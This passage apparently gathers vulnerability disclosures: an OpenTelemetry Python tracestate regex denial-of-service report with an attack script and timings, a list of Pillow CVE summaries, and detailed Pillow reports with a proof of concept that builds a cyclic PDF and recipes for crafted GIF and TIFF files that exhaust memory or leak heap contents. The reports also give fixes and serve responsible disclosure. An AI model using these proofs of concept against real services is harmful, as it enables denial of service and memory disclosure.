"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"   def get(path, extra=""):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f"GET {path} HTTP/1.1
Host: x
Connection: close
{extra}
".encode())     start, data = time.perf_counter(), b""     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b"
")[0].decode()   result = {} extra = f"traceparent: {TRACEPARENT}
tracestate: a=b{' ' * N}x
" attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra))) print("idle /ping:               %.3f s  %s" % get("/ping")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print("/ping during the attack:  %.3f s  %s" % get("/ping")) attacker.join() print("attack request itself:    %.3f s  %s" % result["a"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(" 	") for m in header.split(",")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's P;2L and P;4L raw decoders can read past the end of an input buffer. ImagingRawDecode calculates a packed-pixel row size, while the unpackers read separately padded bit planes. A caller can supply a buffer and image dimensions whose accepted size is smaller than the unpacker's actual footprint. This can disclose up to three adjacent heap bytes in output pixels or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.3.0 until 13.0.0, Pillow has a heap use-after-free when libtiff rejects a tag while encoding TIFF data to an in-memory buffer. When an application saves attacker-influenced TIFF tags to BytesIO, libtiff can reject a tag during encoding in ImagingLibTiffEncode; the error path then frees the output buffer without closing or clearing the TIFF handle, and later cleanup flushes through the write callback into freed memory, which can crash the process and may enable code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, PILfont text-width accumulation in src/_imaging.c checks positive glyph advances against INT_MAX but does not check negative advances against INT_MIN. Repeating a signed 16-bit advance of -32768 can therefore execute a signed C integer overflow in xsize += dx, producing a large positive width from a negative mathematical result. Applications that use getlength(), getsize(), or derived layout, quota, serialization, or allocation calculations can experience logic-integrity errors or resource consumption, while the high-level mask path commonly retains a decompression-bomb check. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, MpoImageFile.seek() and DcxImageFile.seek() reparse later MPO or DCX frames and replace self._size without rerunning Image._decompression_bomb_check(). A crafted multi-frame image can use a tiny first frame to pass Image.open() and then declare an over-limit later frame. Normal frame iteration through seek(), load(), or ImageSequence.Iterator can decode that frame and commit hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's XBM header parser is vulnerable to regular-expression denial of service. In XbmImageFile._open, when an application calls Image.open() on a small crafted XBM file, XbmImagePlugin applies a backtracking expression to the attacker-controlled header before image dimensions are accepted, stalling a worker for minutes and denying service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.2.1 until 13.0.0, Arrow export assumes that an image's rows are tightly contiguous and exports from im->blocks[0].ptr even when PILLOW_ALIGNMENT makes aligned_linesize include row padding or an aligned offset before the first row. The resulting Arrow buffer can include uninitialized padding, bytes preceding the first row, or stale heap contents from previously freed images. Applications that configure alignment and export images to Arrow can therefore disclose one user's pixels or other process memory to another user. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 12.0.0 until 13.0.0, Pillow's Image.merge() can dereference a null image8 plane. Validation skips the first input band, allowing a 32-bit integer or floating-point image backed by image32 storage to be merged as a narrower multiband image. A crafted IPTC file can reach this path when an application opens and loads it, or a caller can invoke Image.merge() directly with such a first band. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

### Summary When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.  ### Details `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:  - `src/PIL/PdfParser.py:1078-1092`  `read_prev_trailer` catches only a repeated offset:  - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)  ### PoC ```python from PIL import PdfParser  # A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2). objs = {     1: b"<< /Type /Catalog /Pages 2 0 R >>",     2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",     3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>", } buf = bytearray(b"%PDF-1.4
") off = {} for oid in (1, 2, 3):     off[oid] = len(buf)     buf += b"%d 0 obj
" % oid + objs[oid] + b"
endobj
" xref = len(buf) buf += b"xref
0 4
0000000000 65535 f 
" buf += b"".join(b"%010d 00000 n 
" % off[o] for o in (1, 2, 3)) buf += b"trailer
<< /Root 1 0 R /Size 4 >>
startxref
%d
%%%%EOF
" % xref open("poc.pdf", "wb").write(buf)  PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way ```  Run it: ``` $ python 11_poc.py RecursionError: maximum recursion depth exceeded ```  The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.  ### Impact A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

This affects applications that catch the "image too large" error raised while stepping to a later animation frame and then keep using the same image object. Pillow correctly refuses the oversized frame, but it stores the refused dimensions on the image object anyway, and later operations size their memory from them. An attacker who can upload a GIF to such a service can exhaust its memory: the process either fails with an out-of-memory error after committing gigabytes, or is killed by the operating system. There is no memory corruption. The bug is in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`). When a frame's extent enlarges the image, the code assigns the new size to `self._size` and only then calls `Image._decompression_bomb_check()`. Nothing restores the old size when `DecompressionBombError` is raised, because `seek()` only rolls back on `EOFError`. After the caught error, `im.size` reports the rejected size while the pixel buffer `im.im` is still the 1×1 first frame. Because the extent is a 16-bit offset plus a 16-bit size, that rejected size can be as large as 131070×131070. In the attached reproducer, the rejected size is 40000×40000. A retried `seek(1)` followed by `load()` then reaches `load_prepare()`, which calls `Image.core.fill()` with that size to decode a single pixel. Peak memory rises from 17 MiB to 1700 MiB before a 3 GiB address-space cap stops the next allocation. `Image.new("RGB", im.size, ...)` and `rotate(..., expand=True)` also allocate from the stale size. The default paths are unaffected: plain `Image.open()` plus `load()`, `ImageSequence.Iterator`, and `n_frames`/`is_animated`. The ordering was introduced in c9f1b35e9810 ("Added GIF decompression bomb check", 2022-06-30, first released in 9.2.0), the check added for CVE-2022-45198. The two dispose-extent checks later in the same function already validate before using the size, and the attached patch makes this check follow the same order. ## Details `GifImageFile._seek()` lets a later frame enlarge the image, and performs the decompression-bomb check for the new size only *after* storing it on the object: ```python # src/PIL/GifImagePlugin.py:289-294 (GifImageFile._seek) x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: self._size = max(x1, self.size[0]), max(y1, self.size[1]) # state mutated Image._decompression_bomb_check(self._size) # ...then validated ``` `_decompression_bomb_check()` (`src/PIL/Image.py:3586`) raises `DecompressionBombError` for anything above `2 * MAX_IMAGE_PIXELS` (178 956 970 px by default), but by then `self._size` already holds the rejected value and nothing restores it: `seek()` (`GifImagePlugin.py:166-179`) only rolls back on `EOFError`, and `_seek(0)` only ever grows `_size`. Compare the two dispose-extent checks a few lines further down in the same function (`GifImagePlugin.py:383` and `:407`), which call `_decompression_bomb_check(dispose_size)` *before* the corresponding `Image.core.fill()`, and `TiffImagePlugin.load_prepare()` (`src/PIL/TiffImagePlugin.py:1319-1321`), which checks `_tile_size` before allocating from it. ``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the nominal strip size on success, not the number of rows produced, and the only check is `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im->image` (which itself is zeroed by `core.new`, so the garbage provably comes from `state->buffer`). `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then `tile_length` rows copied after each `TIFFReadTile()` at 460–488). For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes and the copy is correct. The malicious file differs only in the SOF height of the embedded JPEG; libtiff treats "JPEG smaller than strip" as a warning, clamps the row count to the JPEG height, and reports success. JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode` (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error, libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were checked and do return -1 on short data, so Pillow raises `OSError` for those. The strip path was introduced in `e91b851fdc1c` ("Add reading old-JPEG compressed TIFFs", 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()` (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy. The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02, Pillow 5.3.0). ## Impact Any application that opens attacker-supplied images with Pillow in the default configuration and returns something derived from the pixels (thumbnail, preview, format conversion, OCR text) discloses freed heap memory of the worker process to the uploader: everything below the rows the embedded JPEG/G4 stream actually encodes, up to `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no signal that the image is malformed. What comes back depends on allocator state; in a long-running web worker it is typically recently freed request bodies, other users' decoded image buffers and Python object contents. There is no memory corruption; this is a read of uninitialised (previously used) heap memory, analogous in effect to an out-of-bounds read that lands in pixels. ## Reproducing `repro` is a short Python script that runs against the installed Pillow build with default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it prints is `BUG` or `OK`. **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG encoder. For each layout the script builds two files: - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole 64 KiB strip/tile. - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full strip/tile size as success. **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with `b"LEAK"`, which leaves freed heap chunks about the size of the buffer that `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so any copy in the image came from freed heap memory. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it. ## Suggested fix The attached patch zeroes `state->buffer` before each libtiff read in both loops of `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are deterministic zeros rather than stale heap: ```diff --- a/src/libImaging/TiffDecode.c +++ b/src/libImaging/TiffDecode.c @@ _decodeTile for (x = state->xoff; x < state->xsize; x += tile_width) { + memset(state->buffer, 0, state->bytes); if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { @@ _decodeStrip for (plane = 0; plane < planes; plane++) { ImagingShuffler shuffler = unpackers[plane]; + memset(state->buffer, 0, state->bytes); if (TIFFReadEncodedStrip( ``` A `memset` per strip/tile (rather than one `calloc` after the size is known) is needed because the same buffer is reused for every strip, and a short last strip would otherwise expose the previous strip's rows — harmless for disclosure, but the per-read `memset` keeps the behaviour uniform at the cost of one extra pass over the buffer.
